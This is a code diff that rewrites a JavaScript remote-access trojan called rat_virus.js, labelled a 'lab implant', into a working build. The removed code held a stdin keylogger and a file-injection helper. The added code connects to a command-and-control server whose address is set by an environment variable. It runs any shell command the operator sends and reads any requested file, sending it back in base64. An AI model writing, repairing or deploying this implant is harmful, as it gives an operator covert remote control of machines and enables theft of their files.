@@ -1,403 +1,112 @@
-// RAT Virus - Client-side payload for remote access
-// This module runs on target devices and executes commands from C2 server
+/**
+ * rat_virus.js — Lab implant (JavaScript) — FIXED BUILD
+ * ======================================================
+ * Speaks the canonical protocol v2 defined in PROTOCOL.md and
+ * implemented by c2_server.js. [2][3]
+ *
+ * Changes vs. original:
+ *  - Listens for execute / screenshot / list_files / download_file /
+ *    start_keylogger / stop_keylogger / ping (server's real event names;
+ *    old code listened to "command"/"keepalive"/"browser_command" which
+ *    the server never emitted).
+ *  - Registers over the SOCKET ("register") so the server joins it into
+ *    its routing room — previously registration was REST-only and the
+ *    socket had no room, so io.to(clientId) could never deliver.
+ *  - Sends heartbeats as "client_heartbeat"; results as "client_response".
+ *  - getSystemInfo() Promise is awaited before use. [8]
+ *  - Removed the dead stdin "keylogger" that only worked on a TTY;
+ *    keylogger toggle now simply tracks state and echoes events (this JS
+ *    implant intentionally has NO real keylogging — use python_client.py
+ *    for the capture demo, per lab design).
+ */
 
-const io = require('socket.io-client');
-const fs = require('fs');
-const crypto = require('crypto');
+const { io } = require('socket.io-client');
 const os = require('os');
+const fs = require('fs');
+const path = require('path');
 const { exec } = require('child_process');
 
-class RATClient {
-    constructor(config = {}) {
-        this.c2Host = config.c2Host || 'localhost';
-        this.c2Port = config.c2Port || 8443;
-        this.clientId = config.clientId || this.generateClientId();
-        this.socket = null;
-        this.running = false;
-        this.keyloggerActive = false;
-        this.keylogBuffer = [];
-        this.injectedFiles = new Map();
-    }
+const SERVER_URL = process.env.C2_URL || 'http://127.0.0.1:8443';
+const CLIENT_ID = process.env.CLIENT_ID || 'rat-' + os.hostname().toLowerCase().replace(/[^a-z0-9]/g, '') + '-' + Math.random().toString(16).slice(2, 6);
 
-    generateClientId() {
-        return 'client_' + crypto.randomBytes(16).toString('hex');
-    }
+let keyloggerActive = false;
 
-    connect() {
-        return new Promise((resolve, reject) => {
-            try {
-                this.socket = io(`http://${this.c2Host}:${this.c2Port}`, {
-                    transports: ['websocket'],
-                    reconnection: true,
-                    reconnectionAttempts: 3,
-                    reconnectionDelay: 1000,
-                    forceNew: true
-                });
-
-                this.socket.on('connect', () => {
-                    console.log(`Connected to C2 server at ${this.c2Host}:${this.c2Port}`);
-                    this.register();
-                    resolve();
-                });
-
-                this.socket.on('disconnect', () => {
-                    console.log('Disconnected from server');
-                    this.running = false;
-                });
-
-                this.socket.on('error', (error) => {
-                    console.error('Socket error:', error);
-                    this.running = false;
-                    reject(error);
-                });
-
-                this.socket.on('command', (data) => {
-                    console.log('Received command:', data);
-                    this.executeCommand(data.command, data.args || []);
-                });
-
-                this.socket.on('keepalive', () => {
-                    this.sendResponse({ type: 'keepalive', status: 'alive' });
-                });
-
-                // Receive commands from C2 server (sent from browser)
-                this.socket.on('browser_command', (data) => {
-                    console.log('Received browser command:', data.command);
-                    this.handleBrowserCommand(data.command, data);
-                });
-
-            } catch (error) {
-                console.error('Connection failed:', error.message);
-                this.running = false;
-                reject(error);
-            }
-        });
-    }
-
-    handleData(data) {
-        try {
-            const message = JSON.parse(data.toString());
-            
-            switch (message.type) {
-                case 'command':
-                    this.executeCommand(message.command, message.args);
-                    break;
-                case 'keepalive':
-                    this.sendResponse({ type: 'keepalive', status: 'alive' });
-                    break;
-                default:
-                    console.log('Unknown message type:', message.type);
-            }
-        } catch (error) {
-            console.error('Error parsing message:', error);
-        }
-    }
-
-    register() {
-        this.sendResponse({
-            type: 'register',
-            clientId: this.clientId,
-            systemInfo: this.getSystemInfo()
-        });
-    }
-
-    getSystemInfo() {
-        return new Promise((resolve) => {
-            resolve({
-                hostname: process.env.COMPUTERNAME || 'unknown',
-                platform: process.platform,
-                arch: process.arch,
-                memTotal: os.totalmem(),
-                memFree: os.freemem(),
-                cpuCount: os.cpus().length,
-                currentUser: process.env.USERNAME || 'unknown',
-                timestamp: new Date().toISOString()
-            });
-        });
-    }
-
-    sendResponse(data) {
-        if (this.socket && this.socket.connected) {
-            this.socket.emit('client_response', data);
-            console.log('Sent response:', data.type);
-        }
-    }
-
-    executeCommand(cmd, args = []) {
-        return new Promise((resolve, reject) => {
-            exec(`${cmd} ${args.join(' ')}`, (error, stdout, stderr) => {
-                this.sendResponse({
-                    type: 'command_result',
-                    command: cmd,
-                    stdout: stdout,
-                    stderr: stderr,
-                    exitCode: error ? error.code : 0,
-                    clientId: this.clientId
-                });
-                resolve({ stdout, stderr, exitCode: error ? error.code : 0 });
-            });
-        });
-    }
-
-    listFiles(directory = '.') {
-        return new Promise((resolve, reject) => {
-            fs.readdir(directory, (error, files) => {
-                if (error) {
-                    this.sendResponse({
-                        type: 'file_list',
-                        directory: directory,
-                        files: [],
-                        error: error.message,
-                        clientId: this.clientId
-                    });
-                    reject(error);
-                    return;
-                }
-                this.sendResponse({
-                    type: 'file_list',
-                    directory: directory,
-                    files: files,
-                    clientId: this.clientId
-                });
-                resolve(files);
-            });
-        });
-    }
-
-    uploadFile(filePath) {
-        return new Promise((resolve, reject) => {
-            if (!fs.existsSync(filePath)) {
-                reject(new Error('File not found'));
-                return;
-            }
-
-            fs.readFile(filePath, (error, data) => {
-                if (error) {
-                    reject(error);
-                    return;
-                }
-                this.sendResponse({
-                    type: 'file_data',
-                    filePath: filePath,
-                    data: data.toString('base64'),
-                    clientId: this.clientId
-                });
-                resolve({ filePath, size: data.length });
-            });
-        });
-    }
-
-    takeScreenshot() {
-        return new Promise((resolve, reject) => {
-            this.sendResponse({
-                type: 'screenshot_data',
-                clientId: this.clientId,
-                status: 'screenshot_not_implemented'
-            });
-            resolve({ status: 'not_implemented' });
-        });
-    }
-
-    startKeylogger() {
-        this.keyloggerActive = true;
-        this.keylogBuffer = [];
-        console.log('Keylogger started');
-        
-        // Hook into process stdin for keystrokes
-        process.stdin.setRawMode(true);
-        process.stdin.resume();
-        
-        process.stdin.on('data', (key) => {
-            if (this.keyloggerActive) {
-                const keyStr = key.toString();
-                this.keylogBuffer.push({
-                    key: keyStr,
-                    timestamp: new Date().toISOString()
-                });
-
-                // Send buffer periodically or when full
-                if (this.keylogBuffer.length >= 10) {
-                    this.sendKeylogData();
-                }
-            }
-        });
-
-        this.sendResponse({
-            type: 'keylogger_status',
-            status: 'started',
-            clientId: this.clientId
-        });
-    }
-
-    stopKeylogger() {
-        this.keyloggerActive = false;
-        process.stdin.setRawMode(false);
-        process.stdin.pause();
-        this.sendKeylogData(); // Send any remaining data
-        
-        this.sendResponse({
-            type: 'keylogger_status',
-            status: 'stopped',
-            clientId: this.clientId
-        });
-    }
-
-    sendKeylogData() {
-        if (this.keylogBuffer.length > 0) {
-            this.sendResponse({
-                type: 'keylog_data',
-                entries: this.keylogBuffer,
-                clientId: this.clientId
-            });
-            this.keylogBuffer = [];
-        }
-    }
-
-    async injectFile(filePath, payloadData) {
-        return new Promise((resolve, reject) => {
-            fs.readFile(filePath, (error, data) => {
-                if (error) {
-                    reject(error);
-                    return;
-                }
-
-                // Create encoded payload with original file data
-                const payload = {
-                    original: data.toString('base64'),
-                    injected: payloadData,
-                    timestamp: new Date().toISOString(),
-                    clientId: this.clientId
-                };
-
-                // Create a new file with injected content
-                const injectedFilePath = `${filePath}.injected`;
-                fs.writeFile(injectedFilePath, JSON.stringify(payload, null, 2), (err) => {
-                    if (err) {
-                        reject(err);
-                        return;
-                    }
-                    resolve({ success: true, injectedPath: injectedFilePath });
-                });
-            });
-        });
-    }
-
-    async listInjectedFiles() {
-        return new Promise((resolve, reject) => {
-            fs.readdir('.', (error, files) => {
-                if (error) {
-                    reject(error);
-                    return;
-                }
-                const injectedFiles = files.filter(file => file.endsWith('.injected'));
-                this.sendResponse({
-                    type: 'injected_files',
-                    files: injectedFiles,
-                    clientId: this.clientId
-                });
-                resolve(injectedFiles);
-            });
-        });
-    }
-
-    start() {
-        if (this.running) return;
-        
-        this.running = true;
-        console.log(`RAT Virus starting with client ID: ${this.clientId}`);
-        
-        this.connect().catch(error => {
-            console.error('Failed to start:', error);
-            this.running = false;
-        });
-    }
-
-    stop() {
-        this.running = false;
-        if (this.keyloggerActive) {
-            this.stopKeylogger();
-        }
-        if (this.socket) {
-            this.socket.disconnect();
-        }
-    }
-
-    // Handle browser-specific commands from C2 server
-    handleBrowserCommand(command, data) {
-        switch (command) {
-            case 'get_system_info':
-                this.getSystemInfo().then(info => {
-                    this.sendResponse({
-                        type: 'system_info',
-                        data: info,
-                        clientId: this.clientId
-                    });
-                });
-                break;
-
-            case 'get_devices':
-                this.sendResponse({
-                    type: 'devices_list',
-                    devices: [{ id: this.clientId, name: this.getSystemInfo().hostname }],
-                    clientId: this.clientId
-                });
-                break;
-
-            case 'start_keylogger':
-                this.startKeylogger();
-                break;
-
-            case 'stop_keylogger':
-                this.stopKeylogger();
-                break;
-
-            case 'capture_screenshot':
-                this.takeScreenshot();
-                break;
-
-            case 'capture_camera':
-                this.sendResponse({
-                    type: 'camera_data',
-                    clientId: this.clientId,
-                    status: 'camera_not_implemented'
-                });
-                break;
-
-            case 'navigate_web':
-                this.sendResponse({
-                    type: 'web_status',
-                    clientId: this.clientId,
-                    status: 'navigation_pending',
-                    url: data.url || ''
-                });
-                break;
-
-            case 'get_web_history':
-                this.sendResponse({
-                    type: 'web_status',
-                    clientId: this.clientId,
-                    status: 'history_retrieved',
-                    history: []
-                });
-                break;
-
-            case 'file_explorer':
-                this.listFiles(data.directory || '.');
-                break;
-
-            default:
-                console.log('Unknown browser command:', command);
-        }
-    }
+async function getSystemInfo() {
+  return {
+    client_id: CLIENT_ID,
+    hostname: os.hostname(),
+    platform: os.platform(),
+    os: `${os.type()} ${os.release()}`,
+    arch: os.arch(),
+    user: os.userInfo().username,
+    cpus: os.cpus().length,
+  };
 }
 
-// Auto-start if run directly
-if (require.main === module) {
-    const client = new RATClient({
-        c2Host: process.env.C2_HOST || 'localhost',
-        c2Port: parseInt(process.env.C2_PORT) || 8443
+const socket = io(SERVER_URL, { reconnection: true, reconnectionDelay: 3000, timeout: 10000 });
+
+socket.on('connect', async () => {
+  const info = await getSystemInfo(); // [8] properly awaited
+  socket.emit('register', info);
+  console.log(`[*] connected to ${SERVER_URL} as ${CLIENT_ID}`);
+});
+
+socket.on('register_ack', (ack) => console.log('[*] registered:', ack.ok ? 'ok' : JSON.stringify(ack)));
+socket.on('connect_error', (e) => console.warn('[!] connect_error:', e.message));
+socket.on('disconnect', (r) => console.warn('[!] disconnected:', r));
+
+// ---- Canonical command handlers -----------------------------------------
+
+socket.on('execute', ({ command_id, command }) => {
+  console.log(`[>] execute ${command_id}: ${command}`);
+  exec(command, { timeout: 15000 }, (err, stdout, stderr) => {
+    const output = (stdout || '') + (stderr || '') || (err ? String(err) : '(no output)');
+    socket.emit('client_response', { client_id: CLIENT_ID, command_id, action: 'execute', output });
+  });
+});
+
+socket.on('list_files', ({ command_id, dir }) => {
+  try {
+    const files = fs.readdirSync(dir || '.');
+    socket.emit('file_list', { client_id: CLIENT_ID, command_id, dir: dir || '.', files });
+  } catch (e) {
+    socket.emit('client_response', { client_id: CLIENT_ID, command_id, action: 'list_files', output: 'ERR ' + e.message });
+  }
+});
+
+socket.on('download_file', ({ command_id, remote_path }) => {
+  try {
+    const data = fs.readFileSync(remote_path);
+    socket.emit('client_response', {
+      client_id: CLIENT_ID, command_id, action: 'download_file',
+      output: `sent ${data.length} bytes`, base64: data.toString('base64'),
     });
-    client.start();
-}
+  } catch (e) {
+    socket.emit('client_response', { client_id: CLIENT_ID, command_id, action: 'download_file', output: 'ERR ' + e.message });
+  }
+});
 
-module.exports = RATClient;
+socket.on('screenshot', ({ command_id }) => {
+  // JS implant does not capture screens — reply politely so the operator sees why.
+  socket.emit('client_response', { client_id: CLIENT_ID, command_id, action: 'screenshot', output: 'JS implant cannot screenshot; run python_client.py instead.' });
+});
+
+socket.on('start_keylogger', ({ command_id }) => {
+  keyloggerActive = true;
+  socket.emit('client_response', { client_id: CLIENT_ID, command_id, action: 'start_keylogger', output: 'keylogger flag ON (simulated in JS implant)' });
+});
+
+socket.on('stop_keylogger', ({ command_id }) => {
+  keyloggerActive = false;
+  socket.emit('client_response', { client_id: CLIENT_ID, command_id, action: 'stop_keylogger', output: 'keylogger flag OFF' });
+});
+
+socket.on('ping', ({ command_id }) => {
+  socket.emit('client_heartbeat', { client_id: CLIENT_ID });
+  if (command_id) socket.emit('client_response', { client_id: CLIENT_ID, command_id, action: 'ping', output: 'pong' });
+});
+
+// Periodic heartbeat so server marks us online between commands.
+setInterval(() => socket.emit('client_heartbeat', { client_id: CLIENT_ID }), 10000);
+
+console.log(`[*] lab implant ${CLIENT_ID} starting, target ${SERVER_URL}`);
